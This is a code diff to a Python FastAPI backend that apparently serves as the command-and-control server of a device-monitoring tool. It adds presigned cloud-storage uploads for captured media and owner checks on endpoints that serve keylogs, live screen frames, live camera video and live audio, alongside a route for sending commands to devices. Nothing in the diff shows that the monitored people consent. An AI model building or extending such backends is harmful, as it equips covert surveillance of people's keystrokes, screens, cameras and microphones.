@@ -11,6 +11,7 @@ from app.db import crud, models, database
 from app.db.database import get_db
 from app.core import security
 from app.core.auth import get_current_user, get_current_device
+from app.services import r2_service
 security.get_current_user = get_current_user
 security.verify_device_token = get_current_device
 from datetime import timedelta
@@ -268,9 +269,37 @@ def send_command(device_id: int, command: schemas.CommandBase, db: Session = Dep
     cmd_create = schemas.CommandCreate(**command.dict(), device_id=device_id)
     return crud.create_command(db=db, command=cmd_create, user_id=current_user.id)
 
-@router.get("/devices/{device_id}/media/", response_model=List[schemas.MediaFile])
+@router.get("/devices/{device_id}/media/", response_model=List[schemas.MediaFileResponse])
 def read_media(device_id: int, skip: int = 0, limit: int = 100, db: Session = Depends(get_db), current_user: models.User = Depends(get_current_user)):
-    return crud.get_media_by_device(db=db, device_id=device_id, skip=skip, limit=limit)
+    device = crud.get_device_by_id_and_owner(db, device_id, current_user.id)
+    if not device:
+        raise HTTPException(status_code=403, detail="Device not owned by user")
+    media_files = crud.get_media_by_device(db=db, device_id=device_id, skip=skip, limit=limit)
+    response = []
+    for m in media_files:
+        m_dict = {c.name: getattr(m, c.name) for c in m.__table__.columns}
+        m_dict['url'] = r2_service.generate_presigned_get(m.s3_key)
+        response.append(schemas.MediaFileResponse(**m_dict))
+    return response
+
+@router.post("/media/presigned-put", response_model=schemas.PresignedPutResponse)
+def get_presigned_put(
+    req: schemas.PresignedPutRequest,
+    db: Session = Depends(get_db),
+    current_device: models.Device = Depends(security.verify_device_token)
+):
+    s3_key = f"{current_device.id}/{int(time.time())}_{req.file_name}"
+    upload_url = r2_service.generate_presigned_put(s3_key, req.file_type)
+    return schemas.PresignedPutResponse(upload_url=upload_url, s3_key=s3_key)
+
+@router.post("/media/complete", response_model=schemas.MediaFileResponse)
+def complete_media_upload(
+    req: schemas.MediaFileBase,
+    db: Session = Depends(get_db),
+    current_device: models.Device = Depends(security.verify_device_token)
+):
+    media_create = schemas.MediaFileCreate(**req.dict(), device_id=current_device.id)
+    return crud.create_media_file(db=db, media=media_create, user_id=current_device.owner_id)
 
 @router.post("/devices/me/keylogs/", response_model=schemas.Keylog)
 def create_keylog_for_device(
@@ -322,6 +351,9 @@ def get_latest_live_frame(
     db: Session = Depends(database.get_db),
     current_user: models.User = Depends(security.get_current_user)
 ):
+    device = crud.get_device_by_id_and_owner(db, device_id, current_user.id)
+    if not device:
+        return Response(status_code=403)
     frame = db.query(models.LiveScreenFrame).filter(models.LiveScreenFrame.device_id == device_id).first()
     if not frame or not frame.frame_data:
         return Response(status_code=404)
@@ -351,6 +383,9 @@ def get_latest_live_camera(
     db: Session = Depends(database.get_db),
     current_user: models.User = Depends(security.get_current_user)
 ):
+    device = crud.get_device_by_id_and_owner(db, device_id, current_user.id)
+    if not device:
+        return Response(status_code=403)
     frame = db.query(models.LiveCameraFrame).filter(models.LiveCameraFrame.device_id == device_id).first()
     if not frame or not frame.frame_data:
         return Response(status_code=404)
@@ -380,6 +415,9 @@ def get_latest_live_audio(
     db: Session = Depends(database.get_db),
     current_user: models.User = Depends(security.get_current_user)
 ):
+    device = crud.get_device_by_id_and_owner(db, device_id, current_user.id)
+    if not device:
+        return Response(status_code=403)
     frame = db.query(models.LiveAudioFrame).filter(models.LiveAudioFrame.device_id == device_id).first()
     if not frame or not frame.frame_data:
         return Response(status_code=404)
